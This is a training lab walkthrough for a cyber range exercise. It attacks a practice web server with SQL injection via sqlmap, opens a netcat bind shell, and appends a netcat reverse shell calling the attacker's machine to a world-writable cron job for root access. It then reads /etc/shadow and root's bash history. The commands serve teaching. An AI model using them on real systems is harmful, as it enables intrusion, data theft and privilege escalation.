# CDIS Cyber Range | EU Cyber Attaché Exercise Scenario
<!-- - This write is the simplified version which basically avoids using burpsuite -->
- IP address of the target machine: `10.0.3.193`

## 1) Identify the available network services on the target

> **Duration:** 5 minutes

### 1.1 Execute `nmap` to identify open ports
```sh
nmap 10.0.3.193
```
- Examine the output
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```
<!-- 
- NOTE: Not vulnerable SSH (TCP/22) and a web service (TCP/3306)
-->

## 2) Explore the website

> **Duration:** 5 minutes

- Access `http://10.0.3.193` by using a web browser
- Click the links found on the webpage
- Try to discover (unlinked) webpages (backup pages, orphan pages, hidden pages (e.g., admin page))
- Try to guess a valid username and password for the login page
- Signup to the webpage to create an account for yourself
  - Click the `Signup` button on the homepage 
  - It opens the URL address `http://10.0.3.193/php/inscription.php`
  - Fill out the form to create a user account (do not forget your credentials)
  - Click the signup button
  - It opens the URL address `http://10.0.3.193/php/cuiteur.php`
  - After login, traverse some links on the left pane of the webpage
<!-- 
```sh
dirb http://10.0.3.193 -r
# Alternative method
gobuster dir -u http://10.0.3.193 -w /usr/share/wordlists/dirb/common.txt
# Nothing relevant
```
-->

## 3) Identify an old version of a webpage

> **Duration:** 5 minutes
- Examine the webpage `recherche.php` functionality
  - Enter some text (e.g., your username) into the text field and press the button
  - Examine the requests and responses
- Try to identify an old version of `recherche.php`
  - Identify the webpage URL commented out in the page source (HTML code)
- Visit the URL address `http://10.0.3.193/php/recherche_old.php` using the web browser
- Examine the webpage `recherche.php` functionality
  - Enter some text (e.g., your username) into the text field and press the button
  - Examine the requests and responses
- Identify the first flag in the HTML comments
  
## 4) Misuse input validation vulnerability

> **Duration:** 5 minutes
- Enter a single quote (`'`)  into the text field and press the button
- Examine the related request and response
- Examine the error messages
```
Welcome to the matrix
Database Error - le 28/04/2023 à 05:35:11
File: /var/www/html/php/bibli_cuiteur.php
Line: 806
MySQL Error: 1064 - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1
SQL Request

          SELECT DISTINCT usID, usPseudo, usNom , usAvecPhoto FROM users WHERE usNom LIKE '%'%'

Stacktrace
In file: /var/www/html/php/recherche_old.php
line: 47

Function called: fd_aff_users_simple
Argument #1 : '''
```
- Enter `' or 1=1#` into the text field and press the button
- Examine the output


## 5) Retrieve arbitrary data from the database through SQL injection

> **Duration:** 10 minutes
- Copy a valid request including HTTP headers and the post data to a text file named `sqli.txt`
  - Click somewhere in the webpage > Press F12 > A panel opens below > Click Network tab > Click HTML sub tab > Click into the text field in the HTML page > Type a string > Press Enter > Go back to the panel below > Select the request > Copy the Request headers > Paste into the text editor > Go back to the panel below > Click request tab > Copy post data > Paste into the text editor > Save it
- Note that you cannot use the request below, it is just a sample
```sh
POST /php/recherche_old.php HTTP/1.1
Host: 10.0.3.189
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Origin: http://10.0.3.193
Connection: close
Referer: http://10.0.3.189/php/recherche_old.php
Cookie: PHPSESSID=a62f5c5fio2i8l8spkas8mfjt6
Upgrade-Insecure-Requests: 1

recherche=emre&btnRechercher=Rechercher

```
- Note that `recherche` should have a valid parameter
### 5.1 Execute `sqlmap` to identify database names
```sh
sqlmap -r sqli.txt --dbms=mysql --dbs 
```
- Examine the output
```sh
available databases [5]:
[*] cuiteur
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```
### 5.2 Execute `sqlmap` to identify the table names in the `cuiteur` database
```sh
sqlmap -r sqli.txt --dbms=mysql -D cuiteur --tables
```
- Examine the output
```sh
Database: cuiteur
[7 tables]
+------------+
| blablas    |
| estabonne  |
| flags      |
| mentions   |
| tags       |
| userhealth |
| users      |
+------------+
```
### 5.3 Execute `sqlmap` to identify sensitive data in the `userhealth` table
```sh
sqlmap -r sqli.txt --dbms=mysql -D cuiteur -T userhealth --dump
```
- Examine the output
```sh
Database: cuiteur
Table: userhealth
[6 entries]
+-----+-----------+-----------------------------+
| hID | hIDAuteur | hHealthRecord               |
+-----+-----------+-----------------------------+
| 81  | 1         | Appendix surgery            |
| 82  | 3         | Allergy to cats             |
| 83  | 3         | Cancer treatment            |
| 84  | 4         | Respiratory therapy         |
| 85  | 6         | Hormone replacement therapy |
| 164 | 27        | Stem cell therapy           |
+-----+-----------+-----------------------------+
```
- Execute `sqlmap` to read the contents of other tables to identify more sensitive data

## 6) Grant the initial shell access

> **Duration:** 10 minutes
<!-- 
# NOTE: Bind shell dos not work on port 443/tcp
# Alternative bind shell
# rm /tmp/pipe; mkfifo /tmp/pipe; nc -l 5555 0</tmp/pipe | /bin/bash 1>/tmp/pipe  
-->
### 6.1 Execute `sqlmap` to grant a SQL shell connection via SQL injection
```sh
sqlmap -r sqli.txt --dbms=mysql --os-shell
# Which web application language does the web server support?
# Type 4 and then press enter
```

### 6.2 Execute OS commands through the SQL shell connection
```sh
whoami
# do you want to retrieve the command standard output? [Y/n/a] y
# command standard output: 'www-data'
hostname
# do you want to retrieve the command standard output? [Y/n/a] y
# command standard output: 'ep273u-w1-energetic-bear'
pwd
# do you want to retrieve the command standard output? [Y/n/a] y
# command standard output: '/var/www/html/php'
... 
```

### 6.3 Execute the following command to have a more convenient bind shell access
```sh
rm /tmp/pipe; mkfifo /tmp/pipe; /bin/sh /tmp/pipe | nc -l 5555 > /tmp/pipe
# do you want to retrieve the command standard output? [Y/n/a] n
```

### 6.4 Switch to another terminal on your **Kali** and type the following command to establish a `nc` bind connection
```
nc 10.0.3.189 5555
```

### 6.5 Execute some OS commands through the `nc` connection
```sh
whoami
pwd
locate flag{
# Identify the third flag
cat /var/www/flag{3b200052e26a8c685c53ab507ce4dca76cf53d9936fad0}.jpg
```

### 6.6 Identify a file with a promising filename
```sh
cd ..
ls
ls /var/www/upload
# leaks.zip
# Download the file from the web browser
http://10.0.3.193/upload/leaks.zip
# Read the files compressed
unzip leaks.zip
# The file is password protected
```

### 6.7 Realize also that you have limited access
```sh
cat /etc/shadow
# Access denied
```

## 7) Identify a vulnerable configuration

> **Duration:** 10 minutes
- Enumerate potential privilege escalation vulnerabilities
### 7.1 Identify a world-writable directory
```sh
find / -writable -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/var/www/*" -exec ls -al {} \; 2>/dev/null
```

- Examine the output
```sh
rwxrw-rw- 1 www-data www-data 66 Sep 12  2022 /etc/cron.hourly/cuiteur-cleaning
```

## 8) Escalate privileges to root

> **Duration:** 10 minutes
### 8.1 Examine the cron job with write access for everyone 
```sh
cd /etc/cron.hourly
cat cuiteur-cleaning
```
### 8.2 Open a listener on the **Kali** for a reverse shell connection with root privileges
```sh
sudo nc -nlvp 7777
``` 
### 8.3 Edit the cron job to have a reverse shell payload inside
```sh
# NOTE: You will use your IP address of your Kali
echo "rm /tmp/pipe; mkfifo /tmp/pipe; nc 192.168.0.2 7777 0</tmp/pipe | /bin/sh >/tmp/pipe 2>&1" >> cuiteur-cleaning
```
<!-- 
# Alternative reverse shell payload
# echo "rm /tmp/pipe; mkfifo /tmp/pipe; cat /tmp/pipe | /bin/sh -i 2>&1 | nc 192.168.0.2 7777 > /tmp/pipe" >> cuiteur-cleaning
-->
- The cron job will be automatically executed in a few minutes with root privileges
### 8.4 Execute some OS commands through the `nc` connection
```sh
whoami
pwd
locate flag{
cat /etc/shadow
```
- We can read the files requiring administrative privileges

## 9) Identify a plaintext password in the bash history  

> **Duration:** 5 minutes
### 9.1 Perform post-exploitation activities
```sh
cat /root/.bash_history

# ssh secure-file-exchange.eu
# unzip leak.zip
# x5^#CNYK-Ng@MkHZR748
# unizp leaks.zip
```
### 9.2 Access the password-protected file
```sh
unzip -P x5^#CNYK-Ng@MkHZR748 /home/emre/Downloads/leaks.zip
```
